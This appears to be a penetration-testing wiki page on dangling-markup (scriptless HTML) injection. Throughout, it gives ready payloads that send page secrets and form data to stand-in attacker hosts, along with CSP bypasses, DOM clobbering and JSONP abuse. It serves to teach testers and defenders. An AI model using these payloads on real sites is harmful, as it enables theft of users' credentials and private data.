# Dangling Markup - HTML scriptless injection

{{#include ../../banners/hacktricks-training.md}}

## Summary

This technique can extract information from a user's page when **HTML injection** is possible but direct [**XSS**](../xss-cross-site-scripting/index.html) is not. It is useful when a **secret appears in clear text** later in the HTML or when injected markup can disrupt an existing script workflow.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

Several techniques commented here can be used to bypass some [**Content Security Policy**](../content-security-policy-csp-bypass/index.html) by exfiltrating information in unexpected ways (html tags, CSS, http-meta tags, forms, base...).

## Main Applications

### Stealing clear text secrets

If you inject `<img src='http://evil.com/log.cgi?`, the browser may append the HTML through the next matching quote to the requested URL. If that captured chunk contains a secret, it is sent to the attacker's server. Test both single- and double-quoted variants because the surrounding markup determines where capture ends.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

If the `img` tag is forbidden (due to CSP for example) you can also use `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`

```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```

Note that **Chrome blocks HTTP URLs** with "<" or "\n" in it, so you could try other protocol schemes like "ftp".

You can also abuse CSS `@import` (will send all the code until it find a ";")

```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```

You could also use **`<table`**:

```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```

You could also insert a `<base` tag. All the information will be sent until the quote is closed but it requires some user interaction (the user must click in some link, because the base tag will have changed the domain pointed by the link):

```html
<base target='        <--- Injected
steal me'<b>test</b>
```

### Stealing forms

```html
<base href="http://evil.com/" />
```

Then, the forms that send data to path (like `<form action='update_profile.php'>`) will send the data to the malicious domain.

### Stealing forms 2

Set a form header: `<form action='http://evil.com/log_steal'>` this will overwrite the next form header and all the data from the form will be sent to the attacker.

### Stealing forms 3

The button can change the URL where the information of the form is going to be sent with the attribute "formaction":

```html
<button name="xss" type="submit" formaction="https://google.com">
  I get consumed!
</button>
```

An attacker can use this to steal the information.

Find an [**example of this attack in this writeup**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).<sup>[[5]](#references)</sup>

### Stealing clear text secrets 2

Using the latest mentioned technique to steal forms (injecting a new form header) you can then inject a new input field:

```html
<input type='hidden' name='review_body' value="
```

and this input field will contain all the content between its double quote and the next double quote in the HTML. This attack mix the "_**Stealing clear text secrets**_" with "_**Stealing forms2**_".

You can do the same thing injecting a form and an `<option>` tag. All the data until a closed `</option>` is found will be sent:

```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```

### Form parameter injection

You can change the path of a form and insert new values so an unexpected action will be performed:

```html
<form action="/change_settings.php">
  <input type="hidden" name="invite_user" value="fredmbogo" /> ← Injected lines

  <form action="/change_settings.php">
    ← Existing form (ignored by the parser) ...
    <input type="text" name="invite_user" value="" /> ← Subverted field ...
    <input type="hidden" name="xsrf_token" value="12345" />
    ...
  </form>
</form>
```

### Stealing clear text secrets via noscript

`<noscript></noscript>` Is a tag whose content will be interpreted if the browser doesn't support javascript (you can enable/disable Javascript in Chrome in [chrome://settings/content/javascript](chrome://settings/content/javascript)).

A way to exfiltrate the content of the web page from the point of injection to the bottom to an attacker controlled site will be injecting this:

```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```

### Bypassing CSP with user interaction

From this [portswiggers research](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) you can learn that even from the **most CSP restricted** environments you can still **exfiltrate data** with some **user interaction**.<sup>[[4]](#references)</sup> In this occasion we are going to use the payload:

```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```

Note that you will ask the **victim** to **click on a link** that will **redirect** him to **payload** controlled by you. Also note that the **`target`** attribute inside the **`base`** tag will contain **HTML content** until the next single quote.\
This will make that the **value** of **`window.name`** if the link is clicked is going to be all that **HTML content**. Therefore, as you **control the page** where the victim is accessing by clicking the link, you can access that **`window.name`** and **exfiltrate** that data:

```html
<script>
  if(window.name) {
      new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```

### Misleading script workflow 1 - HTML namespace attack

Insert a new tag with and id inside the HTML that will overwrite the next one and with a value that will affect the flow of a script. In this example you are selecting with whom a information is going to be shared:

```html
<input type="hidden" id="share_with" value="fredmbogo" /> ← Injected markup ...
Share this status update with: ← Legitimate optional element of a dialog
<input id="share_with" value="" />

... function submit_status_update() { ... request.share_with =
document.getElementById('share_with').value; ... }
```

### Misleading script workflow 2 - Script namespace attack

Create variables inside javascript namespace by inserting HTML tags. Then, this variable will affect the flow of the application:

```html
<img id="is_public" /> ← Injected markup ... // Legitimate application code
follows function retrieve_acls() { ... if (response.access_mode == AM_PUBLIC) ←
The subsequent assignment fails in IE is_public = true; else is_public = false;
} function submit_new_acls() { ... if (is_public) request.access_mode =
AM_PUBLIC; ← Condition always evaluates to true ... }
```

### Abuse of JSONP

If you find a JSONP interface you could be able to call an arbitrary function with arbitrary data:

```html
<script src='/editor/sharing.js'>:              ← Legitimate script
  function set_sharing(public) {
    if (public) request.access_mode = AM_PUBLIC;
      else request.access_mode = AM_PRIVATE;
    ...
  }

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
  set_sharing({ ... })
```

Or you can even try to execute some javascript:

```html
<script src="/search?q=a&call=alert(1)"></script>
```

### Iframe abuse

A child document possesses the capability to view and modify the `location` property of its parent, even in cross-origin situations. This allows the embedding of a script within an **iframe** that can redirect the client to an arbitrary page:

```html
<html>
  <head></head>
  <body>
    <script>
      top.window.location = "https://attacker.com/hacked.html"
    </script>
  </body>
</html>
```

This can be mitigated with something like: `sandbox=' allow-scripts allow-top-navigation'`

An iframe can also be abused to leak sensitive information from a different page **using the iframe name attribute**. This is because you can create an iframe that iframes itself abusing the HTML injection that makes the **sensitive info appear inside the iframe name attribute** and then access that name from the initial iframe and leak it.

```html
<script>
  function cspBypass(win) {
    win[0].location = "about:blank"
    setTimeout(() => alert(win[0].name), 500)
  }
</script>

<iframe
  src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27"
  onload="cspBypass(this.contentWindow)"></iframe>
```

For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)<sup>[[6]](#references)</sup>

### \<meta abuse

You could use **`meta http-equiv`** to perform **several actions** like setting a Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` or performing a redirect (in 5s in this case): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

This can be **avoided** with a **CSP** regarding **http-equiv** ( `Content-Security-Policy: default-src 'self';`, or `Content-Security-Policy: http-equiv 'self';`)

### New \<portal HTML tag

You can find detailed **research** on exploitable vulnerabilities of the \<portal tag in [this archived article](https://web.archive.org/web/20260000000000id_/https://research.securitum.com/security-analysis-of-portal-element/).<sup>[[7]](#references)</sup>\
At the moment of this writing you need to enable the portal tag on Chrome in `chrome://flags/#enable-portals` or it won't work.

```html
<portal src='https://attacker-server?
```

### HTML Leaks

Not every HTML connectivity leak works as dangling markup, but the HTTPLeaks corpus contains additional elements and attributes worth testing.<sup>[[8]](#references)</sup>

## SS-Leaks

This is a **mix** between **dangling markup and XS-Leaks**. From one side the vulnerability allows to **inject HTML** (but not JS) in a page of the **same origin** of the one we will be attacking. On the other side we won't **attack** directly the page where we can inject HTML, but **another page**.


{{#ref}}
ss-leaks.md
{{#endref}}

## XS-Search/XS-Leaks

XS-Search techniques **exfiltrate cross-origin information through side channels**. They differ from dangling markup, although some also abuse injected HTML tags—with or without JavaScript—such as [**CSS Injection**](../xs-search/index.html#css-injection) or [**Lazy Load Images**](../xs-search/index.html#image-lazy-loading).


{{#ref}}
../xs-search/
{{#endref}}

## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt
{{#endref}}

## References

- [1] [Content Spoofing? Yes, HTML injection!](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
- [2] [lcamtuf: Post-XSS Exploitation](http://lcamtuf.coredump.cx/postxss/)
- [3] [The Spanner: HTML scriptless attacks](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
- [4] [PortSwigger Research: Evading CSP with DOM-based dangling markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
- [5] [PortSwigger Research: Stealing passwords from infosec Mastodon without bypassing CSP](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)
- [6] [PortSwigger Research: Bypassing CSP with dangling iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)
- [7] [Securitum: Security analysis of the portal element (archived)](https://web.archive.org/web/20260000000000id_/https://research.securitum.com/security-analysis-of-portal-element/)
- [8] [cure53 HTTPLeaks test corpus](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

{{#include ../../banners/hacktricks-training.md}}
